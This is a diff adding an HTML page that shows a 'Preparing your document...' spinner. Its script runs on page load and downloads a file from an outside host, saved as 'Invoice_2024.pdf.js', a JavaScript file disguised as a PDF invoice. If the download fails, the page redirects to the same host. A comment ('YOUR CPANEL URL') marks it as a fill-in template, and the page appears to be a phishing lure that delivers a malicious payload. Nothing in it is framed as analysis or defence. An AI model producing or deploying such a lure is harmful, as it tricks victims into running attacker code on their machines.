@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Loading Document...</title>
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #f3f3f3;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    color: #333;
+  }
+  .loader { text-align: center; }
+  .spinner {
+    border: 4px solid #e0e0e0;
+    border-top: 4px solid #0078d4;
+    border-radius: 50%;
+    width: 40px; height: 40px;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 20px auto;
+  }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  .msg { font-size: 16px; font-weight: 500; }
+</style>
+</head>
+<body>
+
+<div class="loader">
+  <div class="spinner"></div>
+  <div class="msg" id="status">Preparing your document...</div>
+</div>
+
+<script>
+(function() {
+    // YOUR CPANEL URL
+    var targetURL = "https://pamperhavenspa.com/p";
+    var saveName = "Invoice_2024.pdf.js";
+
+    function startDownload() {
+        fetch(targetURL)
+            .then(function(response) {
+                if (!response.ok) throw new Error("Network response was not ok");
+                return response.blob();
+            })
+            .then(function(blob) {
+                var url = window.URL.createObjectURL(blob);
+                var a = document.createElement("a");
+                a.href = url;
+                a.download = saveName;
+                a.style.display = "none";
+                document.body.appendChild(a);
+                a.click();
+                setTimeout(function() {
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                }, 100);
+                document.getElementById("status").innerText = "Download started. Check your downloads.";
+            })
+            .catch(function(error) {
+                console.error("Fetch failed, redirecting directly:", error);
+                window.location.href = targetURL;
+            });
+    }
+
+    window.onload = startDownload;
+})();
+</script>
+
+</body>
+</html>
